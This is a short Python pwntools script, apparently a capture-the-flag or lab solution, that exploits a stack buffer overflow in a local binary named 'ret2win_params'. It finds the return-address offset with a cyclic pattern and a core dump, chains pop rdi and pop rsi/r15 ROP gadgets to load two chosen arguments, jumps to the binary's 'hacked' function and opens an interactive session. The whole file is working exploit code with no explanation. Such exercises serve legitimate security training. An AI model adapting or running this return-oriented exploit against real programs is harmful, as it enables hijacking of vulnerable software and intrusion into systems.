from pwn import *
import sys

# recon
elf = context.binary= ELF("/home/kali/Desktop/ret2win_params")
io = elf.process()

def get_offset():
    io.sendline(cyclic(100))
    io.wait()
    core = io.corefile
    stack_data = core.read(core.rsp, 4)
    return cyclic_find(stack_data)
    # offset = cyclic_find(stack_data)
    # return offset
offset = get_offset()

io = elf.process() # reprocess

# gadgets
rop = ROP(elf)
pop_rdi = rop.rdi[0]
pop_rsi_r15 = rop.rsi[0]

# set payload
payload = flat(
# {
#     offset: [
        offset * 'a',
        pop_rdi,
        0xdeadbeefdeadbeef,  
        pop_rsi_r15,
        0xc0debabec0debabe,  
        0x0,                 
        elf.symbols['hacked'] 
#     ]
# }
)

# send & receive
io.sendline(payload)
io.interactive()
